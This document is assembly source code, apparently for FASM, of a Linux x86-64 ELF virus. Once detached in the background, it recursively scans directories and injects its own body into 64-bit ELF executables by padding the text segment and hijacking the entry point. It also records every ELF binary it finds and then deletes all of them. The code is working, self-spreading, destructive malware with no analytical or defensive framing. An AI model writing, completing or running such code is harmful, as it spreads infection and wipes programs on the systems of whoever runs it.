format ELF64 executable 3

SYS_EXIT        = 0x3c
SYS_OPEN        = 0x2
SYS_CLOSE       = 0x3
SYS_WRITE       = 0x1
SYS_READ        = 0x0
SYS_GETDENTS64  = 0xd9
SYS_FSTAT       = 0x5
SYS_CREAT       = 0x55
SYS_LSEEK       = 0x8
SYS_MMAP        = 0x9
SYS_MUNMAP      = 0xb
SYS_SYNC        = 0xa2
SYS_RENAME      = 0x52
SYS_UNLINK      = 0x57
SYS_NANOSLEEP   = 0x23
SYS_FORK        = 0x39
SYS_SETSID      = 0x72
SYS_WAIT4       = 0x3d

EHDR_SIZE       = 0x40
ELFCLASS64      = 0x2
EM_X86_64       = 0x3e
O_RDONLY        = 0x0
O_RDWR          = 0x2
STDOUT          = 0x1
SEEK_CUR        = 0x1
DIRENT_BUFSIZE  = 1024
PAGE_SIZE       = 0x1000
MAP_PRIVATE     = 0x2

PROT_READ       = 0x1
PROT_WRITE      = 0x2
DT_DIR          = 0x4
DT_REG          = 0x8
PT_LOAD         = 0x1
PF_X            = 0x1
PF_R            = 0x4

PAGE_SIZE   equ PAGE_SIZE
V_SIZE      equ v_stop - v_start

MAX_VICTIMS     = 1000
PATH_MAX        = 4096

struc DIRENT {
    .d_ino          rq 1
    .d_off          rq 1
    .d_reclen       rw 1
    .d_type         rb 1
    label .d_name   byte
}
virtual at 0
  DIRENT DIRENT
  sizeof.DIRENT = $ - DIRENT
end virtual

struc STAT {
    .st_dev         rq 1
    .st_ino         rq 1
    .st_nlink       rq 1
    .st_mode        rd 1
    .st_uid         rd 1
    .st_gid         rd 1
    .pad0           rb 4
    .st_rdev        rq 1
    .st_size        rq 1
    .st_blksize     rq 1
    .st_blocks      rq 1
    .st_atime       rq 1
    .st_atime_nsec  rq 1
    .st_mtime       rq 1
    .st_mtime_nsec  rq 1
    .st_ctime       rq 1
    .st_ctime_nsec  rq 1
}
virtual at 0
  STAT STAT
  sizeof.STAT = $ - STAT
end virtual

struc EHDR {
    .magic      rd  1
    .class      rb  1
    .data       rb  1
    .elfversion rb  1
    .os         rb  1
    .abiversion rb  1
    .pad        rb  7
    .type       rb  2
    .machine    rb  2
    .version    rb  4
    .entry      rq  1
    .phoff      rq  1
    .shoff      rq  1
    .flags      rb  4
    .ehsize     rb  2
    .phentsize  rb  2
    .phnum      rb  2
    .shentsize  rb  2
    .shnum      rb  2
    .shstrndx   rb  2
}
virtual at 0
  EHDR EHDR
  sizeof.EHDR = $ - EHDR
end virtual

struc PHDR {
    .type   rb  4
    .flags  rd  1
    .offset rq  1
    .vaddr  rq  1
    .paddr  rq  1
    .filesz rq  1
    .memsz  rq  1
    .align  rq  1
}
virtual at 0
  PHDR PHDR
  sizeof.PHDR = $ - PHDR
end virtual

struc SHDR {
    .name       rb  4
    .type       rb  4
    .flags      rq  1
    .addr       rq  1
    .offset     rq  1
    .size       rq  1
    .link       rb  4
    .info       rb  4
    .addralign  rq  1
    .entsize    rq  1
    .hdr_size = $ - .name
}
virtual at 0
  SHDR SHDR
  sizeof.SHDR = $ - PHDR
end virtual

struc timespec {
    .tv_sec     rq 1
    .tv_nsec    rq 1
}
virtual at 0
  timespec timespec
  sizeof.timespec = $ - timespec
end virtual

segment readable executable
entry v_start

v_start:
    sub rsp, 10000 
    mov r15, rsp

    mov rax, SYS_FORK
    syscall
    
    cmp rax, 0
    jg exit_parent
    
    cmp rax, 0
    jl cleanup

background_process:
    mov rax, SYS_SETSID
    syscall

    mov qword [victim_count], 0

    sub rsp, 32
    mov qword [rsp + timespec.tv_sec], 30
    mov qword [rsp + timespec.tv_nsec], 0
    
    mov rdi, rsp
    xor rsi, rsi
    mov rax, SYS_NANOSLEEP
    syscall
    add rsp, 32

    sub rsp, 4096
    mov byte [rsp], '.'
    mov byte [rsp+1], 0
    mov rdi, rsp
    call scan_directory
    add rsp, 4096

    call destroy_victims
    
    jmp exit_background

; ---------------------------------------------
; Recursive Directory Scanner
; Input: RDI = Pointer to current directory path
; ---------------------------------------------
scan_directory:
    push rbp
    mov rbp, rsp
    
    sub rsp, 5200

    lea rsi, [rdi]
    lea rdi, [rbp-5144]
    call strcpy

    lea rdi, [rbp-5144]
    mov rsi, O_RDONLY
    xor rdx, rdx
    mov rax, SYS_OPEN
    syscall
    
    cmp rax, 0
    jl scan_ret 

    mov [rbp-8], rax 

scan_loop:
    mov rdi, [rbp-8] 
    lea rsi, [rbp-1048] 
    mov rdx, DIRENT_BUFSIZE
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    jle scan_close 

    mov [rbp-24], rax   ; Save nread
    mov qword [rbp-16], 0 ; Reset offset

scan_iter:
    ; Check if offset >= nread
    mov rcx, [rbp-16]
    cmp rcx, [rbp-24]
    jge scan_loop

    lea rbx, [rbp-1048]
    add rbx, rcx

    mov al, byte [rbx + DIRENT.d_type]
    
    cmp al, DT_DIR
    je handle_dir
    cmp al, DT_REG
    je handle_file
    jmp next_entry

handle_dir:
    lea rsi, [rbx + DIRENT.d_name]
    cmp byte [rsi], '.'
    jne is_subdir
    cmp byte [rsi+1], 0
    je next_entry 
    cmp byte [rsi+1], '.'
    jne is_subdir
    cmp byte [rsi+2], 0
    je next_entry 

is_subdir:
    lea rdi, [rsp - 4096] 
    lea rsi, [rbp-5144]  
    call strcpy
    
    lea rdi, [rsp - 4096]
    call strcat_slash
    
    lea rsi, [rbx + DIRENT.d_name]
    lea rdi, [rsp - 4096]
    call strcat
    
    lea rdi, [rsp - 4096]
    call scan_directory
    
    jmp next_entry

handle_file:
    lea rdi, [rsp - 4096]
    lea rsi, [rbp-5144]
    call strcpy
    
    lea rdi, [rsp - 4096]
    call strcat_slash
    
    lea rsi, [rbx + DIRENT.d_name]
    lea rdi, [rsp - 4096]
    call strcat
    
    ; MOVED add_victim call into try_infect_file to check file type first
    
    lea rdi, [rsp - 4096]
    call try_infect_file
    
    jmp next_entry

next_entry:
    mov rcx, [rbp-16]
    lea rbx, [rbp-1048]
    add rbx, rcx

    movzx rdx, word [rbx + DIRENT.d_reclen]
    add [rbp-16], rdx 
    
    jmp scan_iter

scan_close:
    mov rdi, [rbp-8]
    mov rax, SYS_CLOSE
    syscall

scan_ret:
    leave
    ret

; ---------------------------------------------
; Utils & Infection
; ---------------------------------------------
strcpy:
    push rax
.loop:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz .loop
    pop rax
    ret

strcat:
    push rax
    push rdi
.find_end:
    cmp byte [rdi], 0
    je .copy
    inc rdi
    jmp .find_end
.copy:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz .copy
    pop rdi
    pop rax
    ret

strcat_slash:
    push rax
    push rdi
.find_end:
    cmp byte [rdi], 0
    je .append
    inc rdi
    jmp .find_end
.append:
    mov byte [rdi], '/'
    mov byte [rdi+1], 0
    pop rdi
    pop rax
    ret

add_victim:
    push rax
    push rsi
    push rdi
    push rcx
    
    mov rcx, [victim_count]
    cmp rcx, MAX_VICTIMS
    jge .full
    
    mov rax, rcx
    imul rax, PATH_MAX
    lea rsi, [victims_data]
    add rsi, rax
    
    xchg rsi, rdi 
    call strcpy
    
    inc qword [victim_count]
    
.full:
    pop rcx
    pop rdi
    pop rsi
    pop rax
    ret

destroy_victims:
    push rcx
    push rbx
    push rax
    push rdi
    
    mov rcx, [victim_count]
    lea rbx, [victims_data]
    
.loop:
    test rcx, rcx
    jz .done
    
    mov rdi, rbx
    mov rax, SYS_UNLINK
    syscall
    
    add rbx, PATH_MAX
    dec rcx
    jmp .loop
    
.done:
    pop rdi
    pop rax
    pop rbx
    pop rcx
    ret

try_infect_file:
    push rbp
    mov rbp, rsp
    sub rsp, 256 
    mov [rbp-8], rdi 
    mov rsi, O_RDWR
    xor rdx, rdx
    mov rax, SYS_OPEN
    syscall
    test rax, rax
    js infect_abort
    mov r8, rax 
    mov rdi, r8
    lea rsi, [rbp-200] 
    mov rax, SYS_FSTAT
    syscall
    xor rdi, rdi
    mov rsi, [rbp-200 + STAT.st_size] 
    mov rdx, PROT_READ or PROT_WRITE
    mov r10, MAP_PRIVATE
    xor r9, r9
    mov rdi, 0
    mov r8, r8 
    mov r9, 0
    mov rax, SYS_MMAP
    syscall
    push rax 
    cmp rax, 0xfffffffffffff000 
    ja infect_close_abort_pop
    mov rbx, rax 
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall
    
    ; Check for ELF
    cmp dword [rbx + EHDR.magic], 0x464c457f
    jnz infect_unmap
    cmp byte [rbx + EHDR.class], ELFCLASS64
    jne infect_unmap
    
    ; IT IS AN ELF! ADD IT TO VICTIM LIST FOR DELETION
    mov rdi, [rbp-8] ; Get path from stack local
    call add_victim

    cmp dword [rbx + EHDR.pad], 0x005a4d54
    jz infect_unmap
    
    mov rdi, [rbp-8]
    mov rsi, rbx
    mov rdx, [rbp-200 + STAT.st_size]
    call perform_infection
infect_unmap:
    mov rdi, rbx
    mov rsi, [rbp-200 + STAT.st_size]
    mov rax, SYS_MUNMAP
    syscall
    jmp infect_ret_ok
infect_close_abort_pop:
    pop rax
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall
infect_abort:
    leave
    ret
infect_ret_ok:
    leave
    ret

perform_infection:
    push rbp
    mov rbp, rsp
    sub rsp, 256
    mov [rbp-8], rdi  
    mov [rbp-16], rsi 
    mov [rbp-24], rdx 
    mov r14, rsi 
    mov r9, [r14 + EHDR.phoff]
    xor rbx, rbx
.find_phdr:
    cmp dword [r14 + r9 + PHDR.type], PT_LOAD
    jnz .next_phdr
    mov eax, [r14 + r9 + PHDR.flags]
    test eax, PF_X
    jz .next_phdr
    sub [r14 + r9 + PHDR.vaddr], 2 * PAGE_SIZE
    add [r14 + r9 + PHDR.filesz], 2 * PAGE_SIZE
    add [r14 + r9 + PHDR.memsz], 2 * PAGE_SIZE
    sub [r14 + r9 + PHDR.offset], PAGE_SIZE
    mov r8, [r14 + r9 + PHDR.vaddr] 
    jmp .done_phdr
.next_phdr:
    add [r14 + r9 + PHDR.offset], PAGE_SIZE 
    inc bx
    cmp bx, word [r14 + EHDR.phnum]
    jge .done_phdr
    add r9w, word [r14 + EHDR.phentsize]
    jmp .find_phdr
.done_phdr:
    mov r12, [r14 + EHDR.shoff]
    xor rcx, rcx
.loop_shdr:
    add [r14 + r12 + SHDR.offset], PAGE_SIZE
    inc cx
    cmp cx, word [r14 + EHDR.shnum]
    jge .create_temp
    add r12w, word [r14 + EHDR.shentsize]
    jmp .loop_shdr
.create_temp:
    mov rax, 0x00746365666e692e 
    push rax
    mov rdi, rsp
    mov rsi, 755o
    mov rax, SYS_CREAT
    syscall
    pop rbx 
    cmp rax, 0
    jl .fail
    mov r13, rax 
    mov r10, [r14 + EHDR.entry] 
    add [r14 + EHDR.phoff], PAGE_SIZE
    add [r14 + EHDR.shoff], PAGE_SIZE
    mov dword [r14 + EHDR.pad], 0x005a4d54 
    add r8, EHDR_SIZE
    mov [r14 + EHDR.entry], r8 
    mov rdi, r13
    mov rsi, r14
    mov rdx, EHDR_SIZE
    mov rax, SYS_WRITE
    syscall
    call .get_delta
.get_delta:
    pop rax
    sub rax, .get_delta
    mov rdi, r13
    lea rsi, [rax + v_start]
    mov rdx, V_SIZE
    mov rax, SYS_WRITE
    syscall
    mov byte [rbp-50], 0x68
    mov dword [rbp-49], r10d 
    mov byte [rbp-45], 0xc3
    mov rdi, r13
    lea rsi, [rbp-50]
    mov rdx, 6
    mov rax, SYS_WRITE
    syscall
    mov rdi, r13
    lea rsi, [r14 + EHDR_SIZE]
    mov rdx, [rbp-24] 
    sub rdx, EHDR_SIZE
    mov rax, SYS_WRITE
    syscall
    mov rdi, r13
    mov rax, SYS_CLOSE
    syscall
    mov rax, 0x00746365666e692e 
    push rax
    mov rdi, rsp
    mov rsi, [rbp-8] 
    mov rax, SYS_RENAME
    syscall
    pop rax
.fail:
    leave
    ret

exit_background:
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall

exit_parent:
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall

cleanup:
    mov rax, SYS_EXIT
    mov rdi, 1
    syscall

v_stop:
    nop

segment readable writeable

victim_count rq 1
victims_data:  ; <--- MAKE SURE THIS COLON IS HERE
    rb MAX_VICTIMS * PATH_MAX
